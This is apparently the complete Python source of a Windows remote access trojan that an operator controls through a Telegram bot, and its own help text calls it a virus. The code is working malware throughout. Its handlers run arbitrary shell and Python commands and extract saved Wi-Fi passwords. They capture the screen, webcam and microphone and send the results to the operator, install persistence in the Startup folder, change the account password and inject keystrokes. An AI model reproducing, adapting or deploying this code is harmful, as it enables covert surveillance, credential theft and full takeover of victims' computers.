########################################################################################################################
#                                                   VERSION 1.4                                                        #
#                                                  +open_video                                                         #
########################################################################################################################
import shutil
import sys
import wave
import webbrowser
import keyboard
import pyaudio
import pyautogui
import telebot
import requests
import subprocess
import os
from PIL import ImageGrab, Image
import ctypes
import cv2
import threading
import platform
import config

__version__ = '1.4'
CHAT_ID = config.CHAT_ID
bot = telebot.TeleBot(config.TOKEN)
HELP = """Доступные команды:
        /cmd - выполнить команду
        /wifi_passwords - получить пароли от wifi
        /kill - выключает компьютер
        /restart - перезагрузка
        /kill_rat - самоуничтожение вируса
        /block - блокировка компьютера
        /screen - получение скриншота
        /systeminfo - информация о пк
        /open_url - открыть URL в  браузере
        /open_img - открыть картинку
        /open_video
        /get_camera - получить снимок с камеры
        /code - исполнить любой python код
        /autostart - поставить вирус на автозагрузку
        /change_password - поменять пароль от компа(не работает)
        /tasklist - список запущенных процессов
        /taskkill - завершение процесса по имени
        /update - обновить вирус (не работает)
        /block_mouse - заблокировать мышь
        /hotkey - нажать сочетание клавиш
        /print - набрать что то
        /micro_recording - запись микрофона
        /video_recording - запись видео с камеры
        /desktop - поменять фотографию рабочего стола"""
IP = requests.get("https://ip.42.pl/raw").text
stop = False
START_BLOCK_MOUSE = False
_file = __file__.split('\\')[-1][:-3] + '.exe'
_path1 = f"{os.getcwd()}\\{_file}"
_path2 = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
AUTOSTART_PATH = f"{_path2}\\{_file}"
DECODE = ''
LIST_MICRO = []


def bye():
    url = f"https://ru.infobyip.com/ip-{IP}.html"
    bot.send_message(CHAT_ID,
                     f'Disconnect ip - |[{IP}]({url})|',
                     parse_mode='Markdown')


@bot.message_handler(commands=['HELP', 'help'])
def start(_):
    bot.send_message(CHAT_ID, HELP)


#######################################################################################################################
#                                               CMD                                                                   #
#######################################################################################################################
@bot.message_handler(commands=['cmd', 'CMD'])
def cmd_command_1(message):
    bot.send_message(CHAT_ID, 'Принято, введите команду которую следует выполнить в терминале')
    bot.register_next_step_handler(message, cmd_command_2)


def cmd_command_2(message):
    cmd = message.text
    threading.Thread(target=cmd_command_3, args=(cmd,)).start()


def cmd_command_3(cmd):
    bot.send_message(CHAT_ID, 'выполнение...')
    try:
        res = subprocess.check_output(cmd).decode(DECODE)
        if len(res) > 4096:
            path = os.getenv('APPDATA') + '\\output.txt'
            with open(path, mode='w') as f:
                f.write(res)
            with open(path) as f:
                bot.send_document(CHAT_ID, f)
            os.remove(path)
            bot.send_message(CHAT_ID, f'Команда выполнена успешно.')
        else:
            bot.send_message(CHAT_ID, f'Команда выполнена успешно.')
            bot.send_message(CHAT_ID, f'Результат: {res}')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Что-то пошло не так :(\nОшибка: {ex}')


#######################################################################################################################
#                                               wifi_passwords                                                        #
#######################################################################################################################
@bot.message_handler(commands=['wifi_passwords'])
def get_password(_):
    threading.Thread(target=get_password_2).start()


def get_password_2():
    global DECODE
    path = os.getenv('APPDATA') + '\\passwords.txt'
    try:
        profiles_data = subprocess.check_output('netsh wlan show profiles').decode(DECODE).split('\n')
    except subprocess.CalledProcessError:
        profiles_data = ''
    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]

    for profile in profiles:
        try:
            profile_info = subprocess.check_output(f"netsh wlan show profiles \"{profile}\" key=clear").decode(
                DECODE).split('\n')
        except subprocess.CalledProcessError:
            continue
        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
        except IndexError:
            continue
        with open(path, mode='a') as file:
            file.write(f"{profile}: {password}\n")
        bot.send_message(CHAT_ID, f"{profile}: {password}")
    try:
        with open(path) as file:
            bot.send_document(CHAT_ID, file)
        os.remove(path)
        bot.send_message(CHAT_ID, 'Пароли получены успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                             screen                                                                   #
########################################################################################################################

@bot.message_handler(commands=['screen'])
def get_screen(_):
    threading.Thread(target=get_screen_2).start()


def get_screen_2():
    try:
        image = ImageGrab.grab()
        path = os.getenv('APPDATA') + '\\screenshot.jpg'
        image.save(path)
        bot.send_photo(CHAT_ID, Image.open(path))
        os.remove(path)
        bot.send_message(CHAT_ID, 'Скриншот получен успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                  kill_rat                                                            #
########################################################################################################################
@bot.message_handler(commands=['kill_rat'])
def kill_rat_1(message):
    bot.send_message(CHAT_ID, 'Ты уверен? 1 - удаление с автозагрузки\n2 - просто выключение')
    bot.register_next_step_handler(message, kill_rat_2)


def kill_rat_2(message):
    global stop, AUTOSTART_PATH
    if message.text.lower() in ('1', '2'):
        bot.send_message(CHAT_ID, 'Принято')
        bye()
        stop = True
        bot.stop_bot()
        if message.text.lower() == '1':
            with open(f"{os.getenv('APPDATA')}\\bat_script.bat", mode='w') as f:
                f.write(f'@echo off\n')
                f.write(f"del \"{AUTOSTART_PATH}\"\n")
                f.write(f"del \"{os.getenv('APPDATA')}\\bat_script.bat\"")
            os.system(f"\"{os.getenv('APPDATA')}\\bat_script.bat\"")
    else:
        bot.send_message(CHAT_ID, 'Отмена')


########################################################################################################################
#                                               open_url                                                               #
########################################################################################################################
@bot.message_handler(commands=['open_url'])
def open_url_1(message):
    bot.send_message(CHAT_ID, 'Принято, введите URL')
    bot.register_next_step_handler(message, open_url_2)


def open_url_2(message):
    url = message.text
    threading.Thread(target=open_url_3, args=(url,)).start()


def open_url_3(url):
    try:
        webbrowser.open(url)
        bot.send_message(CHAT_ID, 'Ссылка открылась успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                               kill                                                                   #
########################################################################################################################
@bot.message_handler(commands=['kill'])
def kill_1(message):
    bot.send_message(CHAT_ID, 'Ты уверен? (y, n)')
    bot.register_next_step_handler(message, kill_2)


def kill_2(message):
    global stop
    if message.text.lower() == 'y':
        bot.send_message(CHAT_ID, 'Принято')
        bye()
        stop = True
        os.system('shutdown /s /t 0')
    else:
        bot.send_message(CHAT_ID, 'Отмена')


########################################################################################################################
#                                               systeminfo                                                             #
########################################################################################################################
@bot.message_handler(commands=['systeminfo'])
def systeminfo(_):
    threading.Thread(target=systeminfo_2).start()


def systeminfo_2():
    try:
        bot.send_message(CHAT_ID, 'Выполнение...')
        path = os.getenv('APPDATA') + '\\systeminfo.txt'
        with open(path, mode='w') as file:
            file.write(subprocess.check_output('systeminfo').decode(DECODE))
        with open(path) as file:
            bot.send_document(CHAT_ID, file)
        os.remove(path)
        bot.send_message(CHAT_ID, 'Получение информации о системе прошло успешно')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                               block                                                                  #
########################################################################################################################
@bot.message_handler(commands=['block'])
def block(_):
    try:
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(CHAT_ID, 'Блокировка прошла успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                             get_camera                                                               #
########################################################################################################################
@bot.message_handler(commands=['get_camera'])
def get_camera(_):
    threading.Thread(target=get_camera_2).start()


def get_camera_2():
    try:
        bot.send_message(CHAT_ID, 'Выполнение...')
        path = os.getenv('APPDATA') + '\\image.png'
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite(path, frame)
        cap.release()
        bot.send_photo(CHAT_ID, Image.open(path))
        os.remove(path)
        bot.send_message(CHAT_ID, 'Снимок доставлен успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                             code                                                                     #
########################################################################################################################
@bot.message_handler(commands=['code'])
def code_1(message):
    bot.send_message(CHAT_ID, 'Введите python код')
    bot.register_next_step_handler(message, code_2)


def code_2(message):
    code = message.text
    threading.Thread(target=code_3, args=(code,)).start()


def code_3(code):
    bot.send_message(CHAT_ID, 'Принято. Выполнение...')
    try:
        exec(code)
        bot.send_message(CHAT_ID, 'Успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                            autostart                                                                 #
########################################################################################################################
@bot.message_handler(commands=['autostart'])
def autostart(_):
    threading.Thread(target=autostart_2).start()


def autostart_2():
    global AUTOSTART_PATH
    try:
        file = __file__.split('\\')[-1][:-3] + '.exe'
        path1 = f"{os.getcwd()}\\{file}"
        path2 = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        if os.path.exists(f"{path2}\\{file}"):
            bot.send_message(CHAT_ID, 'Файл уже находится в автозагрузке!')
        else:
            shutil.copy(path1, path2)
            bot.send_message(CHAT_ID, 'Выполнено!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                           restart                                                                    #
########################################################################################################################
@bot.message_handler(commands=['restart'])
def restart_1(message):
    bot.send_message(CHAT_ID, 'Ты уверен? (y, n)')
    bot.register_next_step_handler(message, restart_2)


def restart_2(message):
    global stop
    if message.text.lower() == 'y':
        bot.send_message(CHAT_ID, 'Принято')
        bye()
        stop = True
        os.system('shutdown /r /t 0')
    else:
        bot.send_message(CHAT_ID, 'Отмена')


########################################################################################################################
#                                           change_password                                                            #
########################################################################################################################
@bot.message_handler(commands=['change_password'])
def change_password_1(message):
    bot.send_message(CHAT_ID, 'Принято, введите новый пароль')
    bot.register_next_step_handler(message, change_password_2)


def change_password_2(message):
    password = message.text
    threading.Thread(target=change_password_3, args=(password,)).start()


def change_password_3(password):
    try:

        os.system("net users " + os.getlogin() + " " + password)
        bot.send_message(CHAT_ID, 'Пароль успешно изменён')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    tasklist                                                          #
########################################################################################################################
@bot.message_handler(commands=['tasklist'])
def tasklist(_):
    threading.Thread(target=tasklist_2).start()


def tasklist_2():
    try:
        bot.send_message(CHAT_ID, 'Принято')
        path = os.getenv('APPDATA') + '\\tasklist.txt'
        tasklist_ = subprocess.check_output('tasklist').decode(DECODE)
        with open(path, mode='w') as f:
            f.write(tasklist_)
        with open(path) as f:
            bot.send_document(CHAT_ID, f)
        os.remove(path)
        bot.send_message(CHAT_ID, 'Список процессов получен успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    taskkill                                                          #
########################################################################################################################
@bot.message_handler(commands=['taskkill'])
def taskkill_1(message):
    bot.send_message(CHAT_ID, 'Принято, введите имя процесса')
    bot.register_next_step_handler(message, taskkill_2)


def taskkill_2(message):
    process = message.text
    threading.Thread(target=taskkill_3, args=(process,)).start()


def taskkill_3(process):
    try:
        subprocess.check_output(f'taskkill /f /im {process}').decode(DECODE)
        bot.send_message(CHAT_ID, 'Процесс успешно удалён')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    open_img                                                          #
########################################################################################################################
@bot.message_handler(commands=['open_img'])
def open_img_1(message):
    bot.send_message(CHAT_ID, 'Принято, пришлите картинку или ссылку на неё')
    bot.register_next_step_handler(message, open_img_2)


def open_img_2(message):
    threading.Thread(target=open_img_3, args=(message,)).start()


def open_img_3(message):
    bot.send_message(CHAT_ID, 'Выполнение...')
    try:
        if message.text:
            path = os.getenv('APPDATA') + f'\\image.jpg'
            r = requests.get(message.text)
            with open(path, 'wb') as file:
                file.write(r.content)
        else:
            file_id = message.photo[-1].file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            path = os.getenv('APPDATA') + f'\\image.jpg'
            with open(path, 'wb') as new_file:
                new_file.write(downloaded_file)
        Image.open(path).show()
        os.remove(path)
        bot.send_message(CHAT_ID, 'Изображение открылось успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    update                                                            #
########################################################################################################################
@bot.message_handler(commands=['update'])
def update_1(message):
    bot.send_message(CHAT_ID, 'Принято, пришлите файл обновленного вируса')
    bot.register_next_step_handler(message, update_2)


def update_2(message):
    threading.Thread(target=update_3, args=(message,)).start()


def update_3(message):
    try:
        bot.send_message(CHAT_ID, 'Обновление...')
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file = __file__.split('\\')[-1][:-3] + '.exe'
        path_d_file = os.getcwd() + f'\\_{file}'
        with open(path_d_file, mode='wb') as file:
            file.write(downloaded_file)
        path_bat = os.getcwd() + '\\bat_script.bat'
        with open(path_bat, mode='w') as bat:
            bat.write('@echo off\n')
            bat.write(f"del {os.getcwd()}\\{file}\n")
            bat.write(f"ren {path_d_file} {file}\n")
            bat.write(f'"{os.getcwd()}\\{file}"\n')
            bat.write(f"del {path_bat}\n")
        os.system(f"\"{path_bat}\"")
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    block_mouse                                                       #
########################################################################################################################
@bot.message_handler(commands=['block_mouse'])
def block_mouse_1(_):
    global START_BLOCK_MOUSE
    try:
        if START_BLOCK_MOUSE:
            bot.send_message(CHAT_ID, 'Мышка уже заблокирована')
        else:
            START_BLOCK_MOUSE = True
            pyautogui.FAILSAFE = False
            threading.Thread(target=block_mouse).start()
            bot.send_message(CHAT_ID, 'Мышка заблокирована, для разблокировки команда: /unblock_mouse')
    except Exception as ex:
        START_BLOCK_MOUSE = False
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


def block_mouse():
    x, y = pyautogui.size()
    while True:
        if START_BLOCK_MOUSE:
            pyautogui.moveTo(x // 2, y // 2)
        else:
            return


@bot.message_handler(commands=['unblock_mouse'])
def block_mouse_2(_):
    global START_BLOCK_MOUSE
    if not START_BLOCK_MOUSE:
        bot.send_message(CHAT_ID, 'Мышка не заблокирована')
    else:
        try:
            START_BLOCK_MOUSE = False
            bot.send_message(CHAT_ID, 'Остановка блокировки прошла успешна!')
        except Exception as ex:
            bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    hotkey                                                            #
########################################################################################################################
@bot.message_handler(commands=['hotkey'])
def hotkey_1(message):
    bot.send_message(CHAT_ID, 'Введите хоткей')
    bot.register_next_step_handler(message, hotkey_2)


def hotkey_2(message):
    threading.Thread(target=hotkey_3, args=(message,)).start()


def hotkey_3(message):
    try:
        bot.send_message(CHAT_ID, 'Выполнение...')
        if '+' in message.text:
            pyautogui.hotkey(*message.text.split('+'))
        else:
            pyautogui.hotkey(message.text)
        bot.send_message(CHAT_ID, 'Успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    print                                                             #
########################################################################################################################
@bot.message_handler(commands=['print'])
def print_1(message):
    bot.send_message(CHAT_ID, 'Введите текст')
    bot.register_next_step_handler(message, print_2)


def print_2(message):
    threading.Thread(target=print_3, args=(message,)).start()


def print_3(message):
    try:
        bot.send_message(CHAT_ID, 'Выполнение...')
        keyboard.write(message.text)
        bot.send_message(CHAT_ID, 'Успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    micro_recording                                                   #
########################################################################################################################
@bot.message_handler(commands=['micro_recording'])
def micro_recording_1(message):
    bot.send_message(CHAT_ID, 'Введите количество записываемых секунд и номер микрофона')
    bot.register_next_step_handler(message, micro_recording_2)


def micro_recording_2(message):
    threading.Thread(target=micro_recording_3, args=(message,)).start()


def micro_recording_3(message):
    # global LIST_MICRO
    # bot.send_message(CHAT_ID, 'Запись начата!')
    # LIST_MICRO.clear()
    # thrs = []
    # for i in range(1, 4):
    #     thr = threading.Thread(target=micro_recording_3, args=(message.text, i))
    #     thr.start()
    #     thrs.append(thr)
    # for thr in thrs:
    #     thr.join()
    # for micro in LIST_MICRO:
    #     with open(micro, 'r') as file:
    #         bot.send_document(CHAT_ID, file)
    #     os.remove(micro)
    # bot.send_message(CHAT_ID, 'Успешно!')
    bot.send_message(CHAT_ID, 'Запись начата!')
    filename = os.getenv('APPDATA') + "\\recorded.wav"
    chunk = 1024
    format_ = pyaudio.paInt16
    channels = 1
    sample_rate = 44100
    if len(message.text.split()) == 2:
        seconds, num = map(int, message.text.split())
    else:
        seconds = int(message.text)
        num = -1
    seconds += 1
    p = pyaudio.PyAudio()
    try:
        stream = p.open(format=format_,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        frames_per_buffer=chunk,
                        input_device_index=num)

        frames = [stream.read(chunk) for _ in range(int(44100 / chunk * seconds))]
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(filename, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format_))
        wf.setframerate(sample_rate)
        wf.writeframes(b"".join(frames))
        wf.close()
        with open(filename, 'rb') as f:
            bot.send_document(CHAT_ID, f)
        os.remove(filename)
        bot.send_message(CHAT_ID, 'Успешно')
    except Exception as ex:
        if os.path.exists(filename):
            os.remove(filename)
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    video_recording                                                   #
########################################################################################################################
@bot.message_handler(commands=['video_recording'])
def video_recording_1(message):
    bot.send_message(CHAT_ID, 'Введите количество записываемых секунд и индекс камеры')
    bot.register_next_step_handler(message, video_recording_2)


def video_recording_2(message):
    threading.Thread(target=video_recording_3, args=(message,)).start()


def video_recording_3(message):
    bot.send_message(CHAT_ID, 'видео записывается...')
    filename = os.getenv('APPDATA') + '\\video.mp4'
    try:
        if len(message.text.split()) == 2:
            seconds, num = map(int, message.text.split())
        else:
            seconds = int(message.text)
            num = 0
        vid_capture = cv2.VideoCapture(num, cv2.CAP_DSHOW)
        frame_width = int(vid_capture.get(3))
        frame_height = int(vid_capture.get(4))
        frame_size = (frame_width, frame_height)
        fps = 20
        output = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'XVID'), fps, frame_size)

        for i in range(fps * seconds):
            ret, frame = vid_capture.read()
            if ret:
                output.write(frame)
            else:
                raise Exception('Поток Отключён')
        vid_capture.release()
        output.release()
        with open(filename, 'rb') as file:
            bot.send_document(CHAT_ID, file)
        bot.send_message(CHAT_ID, 'Видео получено успешно!')
        os.remove(filename)
    except Exception as ex:
        if os.path.exists(filename):
            os.remove(filename)
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    desktop                                                   #
########################################################################################################################
@bot.message_handler(commands=['desktop'])
def desktop_1(message):
    bot.send_message(CHAT_ID, 'Пришли фотографию рабочего стола или ссылку')
    bot.register_next_step_handler(message, desktop_2)


def desktop_2(message):
    threading.Thread(target=desktop_3, args=(message,)).start()


def desktop_3(message):
    bot.send_message(CHAT_ID, 'Выполнение...')
    path = os.getenv('APPDATA') + f'\\desktop.jpg'
    try:

        if message.text:
            r = requests.get(message.text)
            with open(path, 'wb') as file:
                file.write(r.content)
        else:
            file_id = message.photo[-1].file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(path, 'wb') as new_file:
                new_file.write(downloaded_file)

        if platform.architecture()[0][:2] == '64':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        elif platform.architecture()[0][:2] == '32':
            ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 0)
        bot.send_message(CHAT_ID, 'Обои поставлены успешно!')
    except Exception as ex:
        if os.path.exists(path):
            os.remove(path)
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                                    open_video                                                       #
########################################################################################################################
@bot.message_handler(commands=['open_video'])
def open_video_1(message):
    bot.send_message(CHAT_ID, 'Принято, пришлите видео или ссылку на него')
    bot.register_next_step_handler(message, open_video_2)


def open_video_2(message):
    threading.Thread(target=open_video_3, args=(message,)).start()


def open_video_3(message):
    bot.send_message(CHAT_ID, 'Выполнение...')
    try:
        if message.text:
            path = os.getenv('APPDATA') + f'\\video.mp4'
            r = requests.get(message.text)
            with open(path, 'wb') as file:
                file.write(r.content)
        else:
            file_id = message.video.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            path = os.getenv('APPDATA') + f'\\video.mp4'
            with open(path, 'wb') as new_file:
                new_file.write(downloaded_file)
        cap = cv2.VideoCapture(path)
        if not cap.isOpened():
            bot.send_message(CHAT_ID, "Ошибка, не удалось открыть файл")
        else:
            while cap.isOpened():
                fl, img = cap.read()
                if img is None:
                    break
                cv2.imshow("", img)
                if cv2.waitKey(25) == "QQQ":
                    break
            cap.release()
            cv2.destroyAllWindows()
        os.remove(path)
        bot.send_message(CHAT_ID, 'Видео открылось успешно!')
    except Exception as ex:
        bot.send_message(CHAT_ID, f'Произошла какая то ошибка: {ex}')


########################################################################################################################
#                                           Запуск программы                                                           #
########################################################################################################################
def main():
    global DECODE
    if sys.platform != 'win32':
        bot.send_message(CHAT_ID, 'Компьютер не windows :(')
        return
    try:
        DECODE = 'utf-8'
        subprocess.check_output('print').decode(DECODE)
    except UnicodeDecodeError:
        try:
            DECODE = 'cp866'
            subprocess.check_output('print').decode(DECODE)
        except UnicodeDecodeError:
            DECODE = 'windows-1251'
    url = f"https://ru.infobyip.com/ip-{IP}.html"
    bot.send_message(CHAT_ID,
                     f'Connected ip - |[{IP}]({url})|\nВерсия: {__version__}\nДля команд пиши /help',
                     parse_mode='Markdown')
    bot.polling()
    if not stop:
        bye()


if __name__ == '__main__':
    main()
